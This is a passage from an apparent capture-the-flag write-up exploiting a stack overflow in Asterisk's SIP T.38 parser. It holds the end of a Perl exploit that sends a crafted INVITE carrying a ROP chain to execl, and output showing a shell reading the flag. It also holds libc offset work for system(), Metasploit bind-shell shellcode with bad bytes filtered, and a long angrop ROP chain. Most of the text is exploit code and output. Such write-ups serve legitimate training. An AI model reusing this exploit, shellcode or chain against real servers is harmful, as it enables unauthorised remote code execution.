	$ropchain .= pack("V", 0x44444444);  # fake ebp

	# jmp to addr in eax
	# 0x080577cf: call eax; pop eax; pop ebx; leave; ret;
	# the commands after call (pop eax etc.) will never be executed,
	# as we execl()
	$ropchain .= pack("V", 0x080577cf);  # call eax

	# args for execl
	$ropchain .= pack("V", $exec_path_addr);   # path
	$ropchain .= pack("V", $exec_arg1_addr);   # arg1
	$ropchain .= pack("V", $exec_arg2_addr);   # arg2
	$ropchain .= pack("V", $exec_arg3_addr);   # arg3
	                                           # null implicit
	return ($ropchain);
}



if(not $ARGV[0]) {
   print "Usage: sipcrash.pl <host>\n";
   exit;
}

my $target=$ARGV[0];
my $target_port = 5060;

my $eip = 0x42424242;
my $padding = "A" x 556;

$payload = create_payload();



my $buf = $padding . $payload;

my $sip_packet = "v=0\n";
$sip_packet .= "o=rtp 1160124458839569000 160124458839569000 IN IP4 127.0.0.1\n";
$sip_packet .= "s=-\n";
$sip_packet .= "c=IN IP4 127.0.0.1\n";
$sip_packet .= "t=0 0\n";
$sip_packet .= "m=image 5004 UDPTL t38\n";
$sip_packet .= "a=T38FaxVersion:0\n";
$sip_packet .= "a=T38MaxBitRate:14400\n";
$sip_packet .= "a=T38FaxMaxBuffer:1024\n";
$sip_packet .= "a=T38FaxMaxDatagram:238\n";
$sip_packet .= "a=T38FaxRateManagement:$buf\n";
$sip_packet .= "a=T38FaxUdpEC:t38UDPRedundancy\n";

$sip_length = length($sip_packet);

my $packet =<<END;
INVITE sip:200\@127.0.0.1 SIP/2.0
CSeq: 1 INVITE
Via: SIP/2.0/UDP 127.0.0.1:1024
From: "Prank Caller" <sip:prank\@127.0.0.1:1024>
Call-ID: aaaaaaaa-aaaa-aaaaaaa-aaaa-aaaaaaaaaaaa\@localhost
To: <sip:200@localhost>
Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE
Content-Type: application/sdp
Content-Length: $sip_length
Max-Forwards: 70

$sip_packet
END

print "Packet\n$packet\n";

print "Sending Packet to: " . $target . "\n\n";
socket(SOCK, PF_INET, SOCK_DGRAM, getprotobyname("udp"));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port, $ipaddr);
send(SOCK, $packet, 0, $sendto) == length($packet) or die "cannot send to $target : $target_port : $!\n";
print "Sent.\n";

DumpString($payload);

```

# Result

```
$ perl sipcrash3.pl 192.168.2.136
...


user@tinysploit2:~$ nc localhost 44444


ls /home/asterisk
FLAG2.TXT
cat /home/asterisk/FLAG2.TXT
MOST EXCELLENT!

You have completed Round 2

The final round poses a harder challenge.
Exploit a stack overflow in Apache mod_jk.so.

You shall need to shut down the Apache web server,
and run it in console mode for convenient debugging.

SSH back into this system as root, using the password: x/64x$ESP

Shutdown Apache using:

httpd -k stop

Use GDB to debug httpd:

gdb httpd
(gdb) run -X

The following HTTP GET request will crash httpd:

GET /BBBBB...4123...BBBBBAAAA HTTP/1.0\r\n\r\n

Remember:

ONE DOES NOT SIMPLY
CONTROL EIP,
JUMP TO THE STACK,
AND EXECUTE SHELLCODE...

Good Luck!
```


# FAILS: What didnt work


## using system

I first wanted to use `system`, but realized it does not work because of
space characters in the string we want to execute with `system`. Spaces
are badchars.

### Find address of system

```
dobin@minime:~/Desktop/sip$ objdump -R asterisk | grep malloc
0815324c R_386_JUMP_SLOT   malloc@GLIBC_2.0
```

Note: the following commands need to be executed after malloc() get resolved by asterisk. So it is not enough just to do "gdb asterisk", but you have to attach to a running asterisk process.


addr of malloc in plt:
```
(gdb) x/1x 0x0815324c
0x815324c <malloc@got.plt>:	0xb7438160
```

addr of malloc in libc mapped in process:
```
(gdb) x/1x 0xb7438160
0xb7438160 <malloc>:	0x0ce85356
```


check offset in libc between malloc and system:
```
user@tinysploit2:~$ objdump -T /lib/libc-2.17.so | egrep "malloc|system"
[...]
00079160 g    DF .text	00000136  GLIBC_2.0   malloc
0003f1a0  w   DF .text	0000008d  GLIBC_2.0   system
```

```
dobin@minime:~/Desktop/sip$ printf "%x\n" $((0x00079160-0x0003f1a0))
39fc0
```

```
(gdb) x/1x 0xb7438160-0x39fc0
0xb73fe1a0 <system>:	0x891cec83
```

So, to get address of system:
- get address of malloc: `mov reg, [0x0815324c]`
- mov offset to system to a register: `mov reg2, 0x39fc0`
- add reg and reg2 to reg3, which has now the system() offset

### create system() shellcode

Finding an adequate `sub` gadget:

```
(asterisk/ELF/x86)> search /3/ sub e%, [%]
[INFO] Searching for gadgets: sub e%, [%]
[INFO] File: asterisk
0x080fb061: sub eax, 0x8402b60f; sal byte ptr [edi + esi + 0xf], 0xb6; adc edi, dword ptr [eax]; ret 0x5074;
0x080f3a21: sub ebx, dword ptr [eax - 5]; dec ecx; mov eax, 0xffffffff; ret;
0x080a8413: sub ecx, dword ptr [ecx - 0x762e763d]; ret 0xc031;
```

### testing

Oups, it is corrupted. Started to test for bad chars, and its spaces and others.



## Shellcode

Wanted to do shellcode. Used angrop. But it also contained bad chars.

### generate shellcode

Use metasploit to create shellcode, excluding bad chars:

```
msf > use payload/linux/x86/shell_bind_tcp
msf payload(shell_bind_tcp) > options

Module options (payload/linux/x86/shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address

msf payload(shell_bind_tcp) > generate -b '\x00\xff\x09\x0a\x0b\x0c\x0d\x20'
# linux/x86/shell_bind_tcp - 105 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,
# PrependSetresuid=false, PrependSetreuid=false,
# PrependSetuid=false, PrependSetresgid=false,
# PrependSetregid=false, PrependSetgid=false,
# PrependChrootBreak=false, AppendExit=false,
# InitialAutoRunScript=, AutoRunScript=
buf =
"\xd9\xc1\xbd\xa6\xe2\xd0\x3e\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x14\x83\xef\xfc\x31\x6f\x15\x03\x6f\x15\x44\x17\xe1" +
"\xe5\x7f\x3b\x51\x59\x2c\xd6\x54\xd4\x33\x96\x3f\x2b\x33" +
"\x8c\xe1\xe1\x5b\x31\x1e\x17\xc7\x5f\x0e\x46\xa7\x16\xcf" +
"\x02\x21\x71\xdd\x53\x24\xc0\xd9\xe0\x32\x73\x87\xcb\xba" +
"\x30\xf8\xb2\x77\x36\x6b\x63\xed\x08\xd4\x59\x71\x3f\x9d" +
"\x99\x19\xef\x72\x29\xb1\x87\xa3\xaf\x28\x36\x35\xcc\xfa" +
"\x95\xcc\xf2\x4a\x12\x02\x74"
```

### shellcode to rop

Convert the shellcode to a rop sequence with angrop:

```
>>> import angr, angrop
>>> p = angr.Project("./asterisk")
>>> rop = p.analyses.ROP()
>>> rop.find_gadgets()
>>> shellcode = "\xd9\xc1\xbd\xa6\xe2\xd0\x3e\xd9\x74\x24\xf4\x5f\x2b\xc9" + "\xb1\x14\x83\xef\xfc\x31\x6f\x15\x03\x6f\x15\x44\x17\xe1" + "\xe5\x7f\x3b\x51\x59\x2c\xd6\x54\xd4\x33\x96\x3f\x2b\x33" + "\x8c\xe1\xe1\x5b\x31\x1e\x17\xc7\x5f\x0e\x46\xa7\x16\xcf" + "\x02\x21\x71\xdd\x53\x24\xc0\xd9\xe0\x32\x73\x87\xcb\xba" + "\x30\xf8\xb2\x77\x36\x6b\x63\xed\x08\xd4\x59\x71\x3f\x9d" + "\x99\x19\xef\x72\x29\xb1\x87\xa3\xaf\x28\x36\x35\xcc\xfa" + "\x95\xcc\xf2\x4a\x12\x02\x74"
>>> chain = rop.write_to_mem(0x815e324, shellcode)

>>> chain.print_payload_code()
chain = ""
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e324)
chain += p32(0xa6bdc1d9)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e328)
chain += p32(0xd93ed0e2)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e32c)
chain += p32(0x5ff42474)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e330)
chain += p32(0x14b1c92b)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e334)
chain += p32(0x31fcef83)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e338)
chain += p32(0x6f03156f)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e33c)
chain += p32(0xe1174415)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e340)
chain += p32(0x513b7fe5)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e344)
chain += p32(0x54d62c59)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e348)
chain += p32(0x3f9633d4)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e34c)
chain += p32(0xe18c332b)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e350)
chain += p32(0x1e315be1)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e354)
chain += p32(0xe5fc717)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e358)
chain += p32(0xcf16a746)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e35c)
chain += p32(0xdd712102)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e360)
chain += p32(0xd9c02453)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e364)
chain += p32(0x877332e0)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e368)
chain += p32(0xf830bacb)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e36c)
chain += p32(0x6b3677b2)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e370)
chain += p32(0xd408ed63)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e374)
chain += p32(0x9d3f7159)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e378)
chain += p32(0x72ef1999)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e37c)
chain += p32(0xa387b129)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e380)
chain += p32(0x353628af)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e384)
chain += p32(0xcc95facc)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e388)
chain += p32(0x2124af2)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret
chain += p32(0x808a400)	# pop edi; pop ebp; ret
chain += p32(0x815e38c)
chain += p32(0xffffff74)
chain += p32(0x8111d3d)	# adc al, 0xf; xchg eax, ebp; ret
chain += p32(0x80aabb1)	# stosd dword ptr es:[edi], eax; ret

>>> chain.payload_str()
'\x00\xa4\x08\x08$\xe3\x15\x08\xd9\xc1\xbd\xa6=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08(\xe3\x15\x08\xe2\xd0>\xd9=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08,\xe3\x15\x08t$\xf4_=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x080\xe3\x15\x08+\xc9\xb1\x14=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x084\xe3\x15\x08\x83\xef\xfc1=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x088\xe3\x15\x08o\x15\x03o=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08<\xe3\x15\x08\x15D\x17\xe1=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08@\xe3\x15\x08\xe5\x7f;Q=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08D\xe3\x15\x08Y,\xd6T=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08H\xe3\x15\x08\xd43\x96?=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08L\xe3\x15\x08+3\x8c\xe1=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08P\xe3\x15\x08\xe1[1\x1e=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08T\xe3\x15\x08\x17\xc7_\x0e=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08X\xe3\x15\x08F\xa7\x16\xcf=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08\\\xe3\x15\x08\x02!q\xdd=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08`\xe3\x15\x08S$\xc0\xd9=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08d\xe3\x15\x08\xe02s\x87=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08h\xe3\x15\x08\xcb\xba0\xf8=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08l\xe3\x15\x08\xb2w6k=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08p\xe3\x15\x08c\xed\x08\xd4=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08t\xe3\x15\x08Yq?\x9d=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08x\xe3\x15\x08\x99\x19\xefr=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08|\xe3\x15\x08)\xb1\x87\xa3=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08\x80\xe3\x15\x08\xaf(65=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08\x84\xe3\x15\x08\xcc\xfa\x95\xcc=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08\x88\xe3\x15\x08\xf2J\x12\x02=\x1d\x11\x08\xb1\xab\n\x08\x00\xa4\x08\x08\x8c\xe3\x15\x08t\xff\xff\xff=\x1d\x11\x08\xb1\xab\n\x08'

>>> len(chain.payload_str())
540

```

The "pop edi" gadget contains null bytes... awesome. I just do a search/replace
with my own gadget.
```
(asterisk/ELF/x86)> settings badbytes 00090a0b200c0d
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
(asterisk/ELF/x86)> search pop edi
[INFO] Searching for gadgets: pop edi
[INFO] File: asterisk
...
0x080e0381: pop edi; pop ebp; ret;
```

```
'\x81\x03\x0e\x08$\xe3\x15\x08\xd9\xc1\xbd\xa6=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08(\xe3\x15\x08\xe2\xd0>\xd9=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08,\xe3\x15\x08t$\xf4_=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x080\xe3\x15\x08+\xc9\xb1\x14=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x084\xe3\x15\x08\x83\xef\xfc1=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x088\xe3\x15\x08o\x15\x03o=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08<\xe3\x15\x08\x15D\x17\xe1=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08@\xe3\x15\x08\xe5\x7f;Q=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08D\xe3\x15\x08Y,\xd6T=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08H\xe3\x15\x08\xd43\x96?=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08L\xe3\x15\x08+3\x8c\xe1=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08P\xe3\x15\x08\xe1[1\x1e=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08T\xe3\x15\x08\x17\xc7_\x0e=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08X\xe3\x15\x08F\xa7\x16\xcf=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08\\\xe3\x15\x08\x02!q\xdd=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08`\xe3\x15\x08S$\xc0\xd9=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08d\xe3\x15\x08\xe02s\x87=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08h\xe3\x15\x08\xcb\xba0\xf8=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08l\xe3\x15\x08\xb2w6k=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08p\xe3\x15\x08c\xed\x08\xd4=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08t\xe3\x15\x08Yq?\x9d=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08x\xe3\x15\x08\x99\x19\xefr=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08|\xe3\x15\x08)\xb1\x87\xa3=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08\x80\xe3\x15\x08\xaf(65=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08\x84\xe3\x15\x08\xcc\xfa\x95\xcc=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08\x88\xe3\x15\x08\xf2J\x12\x02=\x1d\x11\x08\xb1\xab\n\x08\x81\x03\x0e\x08\x8c\xe3\x15\x08t\xff\xff\xff=\x1d\x11\x08\xb1\xab\n\x08'
```

It has still invalid bytes. E.g.:

0x0a in the gadget:
```
chain += p32(0x8 0a abb1)	# stosd dword ptr es:[edi], eax; ret
```

So i gave up this way.
